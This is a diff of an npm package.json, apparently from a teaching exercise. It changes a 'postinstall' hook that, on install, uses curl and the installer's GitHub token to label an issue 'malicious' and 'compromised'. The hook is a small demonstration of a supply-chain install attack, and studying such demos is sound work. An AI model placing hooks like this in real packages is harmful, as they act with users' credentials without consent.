@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "postinstall": "curl -X POST https://api.github.com/repos/Demo-INF806/task_2/issues/42/labels -H 'Authorization: token $GITHUB_TOKEN' -d '[\"malicious\", \"compromised\"]'"
+    "postinstall": "curl -X POST https://api.github.com/repos/Demo-INF806/task_2/issues/1/labels -H 'Authorization: token $GITHUB_TOKEN' -d '[\"malicious\", \"compromised\"]'"
   },
   "author": "",
   "license": "ISC",
